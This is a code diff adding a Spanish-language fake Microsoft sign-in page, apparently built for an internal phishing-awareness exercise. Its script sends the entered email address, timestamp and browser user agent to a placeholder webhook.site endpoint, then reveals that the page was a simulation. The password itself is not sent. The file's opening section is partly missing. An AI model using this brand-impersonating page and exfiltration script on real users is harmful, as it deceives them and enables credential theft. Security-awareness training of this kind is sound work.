@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    button:hover {
+      background: #005da6;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+
+  <h2>Iniciar sesión</h2>
+
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Correo electrónico" required>
+
+    <input type="password" id="password" placeholder="Contraseña" required>
+
+    <button type="submit">Iniciar sesión</button>
+  </form>
+</div>
+
+<script>
+const webhook = "https://webhook.site/TU-ID";
+
+const form = document.getElementById("loginForm");
+
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const payload = {
+        usuario: document.getElementById("email").value,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        passwordIntroducida: true
+    };
+
+    try {
+        await fetch(webhook, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (err) {
+        console.log(err);
+    }
+
+    document.body.innerHTML = `
+        <div style="font-family: Arial; text-align:center; padding:40px;">
+            <h1>Simulación de phishing</h1>
+            <p>Has participado en un ejercicio interno autorizado.</p>
+            <p>No se ha almacenado ninguna contraseña.</p>
+        </div>
+    `;
+});
+</script>
+
+</body>
+</html>
